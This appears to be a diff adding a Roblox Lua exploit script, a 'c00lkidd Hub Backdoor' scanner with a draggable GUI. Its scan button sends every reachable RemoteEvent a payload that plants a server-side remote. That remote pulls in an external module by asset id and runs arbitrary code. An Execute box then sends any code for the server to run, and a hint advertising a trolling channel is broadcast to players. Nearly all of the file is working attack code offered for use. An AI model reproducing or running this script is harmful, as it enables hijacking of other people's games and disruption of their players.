@@ -1,0 +1,215 @@
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FancyDraggableUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 420, 0, 280)
+frame.Position = UDim2.new(0.3, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Parent = screenGui
+
+
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 30)
+header.BackgroundColor3 = Color3.fromRGB(50, 50, 90)
+header.BorderSizePixel = 0
+header.Parent = frame
+
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 1, 0)
+title.BackgroundTransparency = 1
+title.Text = "c00lkidd Hub Backdoor"
+title.TextColor3 = Color3.fromRGB(20, 20, 30)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Position = UDim2.new(0, 10, 0, 0)
+title.Parent = header
+
+
+local box = Instance.new("TextBox", frame)
+box.Size = UDim2.new(1, -20, 0, 190)
+box.Position = UDim2.new(0, 10, 0, 40)
+box.BackgroundColor3 = Color3.fromRGB(50, 50, 90)
+box.TextColor3 = Color3.fromRGB(0, 0, 0)
+box.Font = Enum.Font.Code
+box.TextSize = 16
+box.ClearTextOnFocus = false
+box.MultiLine = true
+box.TextWrapped = true
+box.TextXAlignment = Enum.TextXAlignment.Left
+box.TextYAlignment = Enum.TextYAlignment.Top
+box.Text = "www.youtube.com/@c00lkidd_Trolling"
+box.Visible = false
+
+
+local exec = Instance.new("TextButton", frame)
+exec.Size = UDim2.new(0.48, 0, 0, 30)
+exec.Position = UDim2.new(0.03, 0, 1, -35)
+exec.BackgroundColor3 = Color3.fromRGB(50, 50, 90)
+exec.Text = "Execute"
+exec.TextColor3 = Color3.new(0, 0, 0)
+exec.Font = Enum.Font.SourceSansBold
+exec.TextSize = 16
+exec.Visible = false
+
+exec.MouseButton1Click:Connect(function()
+	local source = box.Text
+	local feRemote = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
+
+	if feRemote then
+		feRemote:FireServer([[ 
+			local user_code = ]] .. string.format("%q", source) .. [[
+			local loadsuccess, loadfunc = pcall(loadstring, user_code)
+			if loadsuccess and loadfunc then
+				pcall(loadfunc)
+			end
+		]])
+	else
+		local fn, err = loadstring(source)
+		if fn then
+			pcall(fn)
+		end
+	end
+end)
+
+
+local clear = Instance.new("TextButton", frame)
+clear.Size = UDim2.new(0.48, 0, 0, 30)
+clear.Position = UDim2.new(0.51, 0, 1, -35)
+clear.BackgroundColor3 = Color3.fromRGB(50, 50, 90)
+clear.Text = "Clear"
+clear.TextColor3 = Color3.new(0, 0, 0)
+clear.Font = Enum.Font.SourceSansBold
+clear.TextSize = 16
+clear.Visible = false
+
+	
+
+local dragging = false
+local dragInput, mousePos, framePos
+
+header.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		mousePos = input.Position
+		framePos = frame.Position
+	end
+end)
+
+header.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = false
+	end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+		local delta = input.Position - mousePos
+		frame:TweenPosition(UDim2.new(
+			framePos.X.Scale, framePos.X.Offset + delta.X,
+			framePos.Y.Scale, framePos.Y.Offset + delta.Y
+		), "Out", "Quad", 0.1, true)
+	end
+end)
+
+
+local closeBtn = Instance.new("TextButton", frame)
+closeBtn.Size = UDim2.new(0, 40, 0, 30)
+closeBtn.Position = UDim2.new(0, 379, 1, -279)
+closeBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.fromRGB(50, 50, 90)
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 20
+
+closeBtn.MouseButton1Click:Connect(function()
+	frame:Destroy()
+end)
+
+
+local scanner = Instance.new("TextButton", frame)
+scanner.Size = UDim2.new(0, 300, 0, 100)
+scanner.Position = UDim2.new(0, 56, 1, -190)
+scanner.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+scanner.Text = "Scan Backdoor"
+scanner.TextColor3 = Color3.fromRGB(50, 50, 90)
+scanner.Font = Enum.Font.GothamBold
+scanner.TextSize = 30
+
+clear.MouseButton1Click:Connect(function()
+	box.Text = ""
+end)
+
+scanner.MouseButton1Click:Connect(function()
+	local function b_G_V12(see)
+		local a = function(ree)
+			ree:FireServer([[ 
+				local folder = Instance.new('RemoteEvent')
+				folder.Name = "_FEBYPASS32"
+				folder.Parent = game:GetService("JointsService")
+				local loadstring = require(13684410229)
+				folder.OnServerEvent:Connect(function(_1,_2)
+					loadstring(_2)()
+				end)
+			]])
+		end
+		for i, v in pairs(see:GetChildren()) do
+			if v:IsA("RemoteEvent") then
+				if not string.match(string.lower(v.Name), "ban") and not string.match(string.lower(v.Name), "kick") then
+					a(v)
+				end
+			end
+			b_G_V12(v)
+		end
+	end
+
+	scanner.Text = "scanning."
+	wait(0.5)
+	scanner.Text = "scanning.."
+	wait(0.5)
+	scanner.Text = "scanning..."
+	wait(0.5)
+	scanner.Text = "scanning."
+	wait(0.5)
+	scanner.Text = "scanning.."
+	wait(0.5)
+	scanner.Text = "scanning..."
+	wait(0.5)
+	scanner.Text = "no Backdoor"
+
+	b_G_V12(game:GetService("ReplicatedStorage"))
+
+	local timetoken = 0
+	local maxtime = 5
+	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
+
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		scanner.Text = "Backdoor Found👍"
+		wait(0.5)
+		clear.Visible = true
+		exec.Visible = true
+		box.Visible = true
+		scanner.Visible = false
+
+		wait(1)
+			local feRemote = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
+		if feRemote then
+			feRemote:FireServer([[ 
+				local hint = Instance.new("Hint")
+				hint.Text = "c00lkidd Hub Backdoor fast backdoor scanner www.YouTube.com/@c00lkidd_Trolling "
+				hint.Parent = game.Workspace
+				task.delay(30, function() hint:Destroy() end)
+			]])
+	end
+ end
+end)
